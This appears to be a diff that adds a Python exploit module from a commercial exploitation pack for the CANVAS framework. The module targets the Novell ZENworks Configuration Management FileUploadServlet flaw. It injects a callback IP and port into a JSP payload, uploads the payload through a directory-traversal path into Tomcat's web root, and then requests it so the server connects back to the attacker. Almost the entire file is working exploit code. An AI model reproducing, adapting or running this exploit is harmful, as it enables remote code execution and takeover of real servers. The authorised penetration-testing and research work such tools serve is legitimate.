@@ -1,0 +1,129 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2010
+#
+
+import sys
+import time
+import os
+import random
+
+from urllib import urlopen
+from sgmllib import SGMLParser
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from httplib import HTTPConnection, HTTPSConnection
+
+# GUI info
+NAME = "Novell ZENworks Configuration Management FileUploadServlet Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote Code Execution Vulnerability in Novell ZENworks Configuration Management"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Novell"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Versions Affected"] = "Novell ZENworks Configuration Management < 10.3"
+DOCUMENTATION["Date public"] = "2010.04.23"
+DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-10-078/"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = '1.0'
+
+GTK2_DIALOG = 'dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+
+NOTES="""
+Start converttomosdef to get a MOSDEF node from the JAVA node.
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ""    
+    self.filename = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_robohelp/d2.jsp"    
+    self.port = 80
+    self.https = 0
+    self.name = NAME
+    return
+
+  def neededListenerTypes(self):
+    return [canvasengine.JAVASERVER]
+	
+  def upload_file(self):
+  
+    f = open(self.filename, "r")
+    data = f.read()
+    f.close()
+    
+    data = data.replace("CALLBACK_IP", self.callback.ip)
+    data = data.replace("CALLBACK_PORT", str(self.callback.port))
+    
+    try:					
+      if self.https == 0:
+      	cnx = HTTPConnection(self.host, self.port)
+      else:
+      	cnx = HTTPSConnection(self.host, self.port)
+      
+      # Upload JSP file            
+      url = "/zenworks-fileupload/?type=../../share/tomcat/webapps/ROOT/&filename=d2.jsp&overwrite=true"
+      headers = {'User-Agent':'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)', 'Content-Type':'application/octet-stream'}
+      
+      cnx.request("POST", url, data, headers)			
+      resp = cnx.getresponse()           
+      
+      # Execute uploaded JSP file
+      url = "/d2.jsp"
+      cnx.request("GET", url, None, {'User-Agent':'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)'})			  
+      cnx.close()            
+      
+    except:
+      self.log("HTTP(S) error")
+      return 0
+      		
+    return 1
+
+  def getargs(self):	
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port", self.port)) 
+    self.https = int(self.argsDict.get("https", self.https))  
+
+  def run(self):
+    self.getargs()
+    self.setInfo("%s attacking %s"%(NAME,self.host))
+ 
+    ret = self.upload_file()
+    
+    self.setInfo("%s attacking %s - done"%(NAME, self.host))
+    
+    return ret
+
+  def usage(self):
+    print "Usage: " + sys.argv[0] + " -t target -p port -O https:[0|1]"
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
